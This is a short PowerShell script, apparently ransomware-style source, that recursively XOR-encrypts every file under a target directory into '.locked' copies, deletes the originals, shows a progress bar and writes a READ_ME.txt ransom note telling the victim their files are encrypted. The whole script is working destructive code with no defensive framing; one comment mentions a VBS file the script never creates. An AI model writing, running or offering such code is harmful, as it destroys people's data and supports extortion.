param (
    [string]$targetDir,
    [string]$key
)

Function Encrypt-File {
    param ($path, $key)
    $bytes = [System.IO.File]::ReadAllBytes($path)
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = $bytes[$i] -bxor $key[$i % $key.Length]
    }
    $encPath = "$path.locked"
    [System.IO.File]::WriteAllBytes($encPath, $bytes)
    Remove-Item $path
}

$files = Get-ChildItem -Path $targetDir -Recurse -File
$total = $files.Count
$count = 0

foreach ($file in $files) {
    Encrypt-File $file.FullName ([System.Text.Encoding]::UTF8.GetBytes($key))
    $count++
    $percent = [math]::Round(($count / $total) * 100)
    $bar = "#" * ($percent / 2)
    Write-Host "`r[$bar$([string]::new(' ', 50 - $bar.Length))] $percent%" -NoNewline
    Start-Sleep -Milliseconds 100
}

# Ransom note text
$noteText = @"
YOUR FILES HAVE BEEN ENCRYPTED.
To get them back, run 'unlock.bat' and enter the correct decryption key.
"@

# Path where ransom note and VBS go
$notePath = Join-Path $targetDir "READ_ME.txt"

# Write the note
Set-Content -Path $notePath -Value $noteText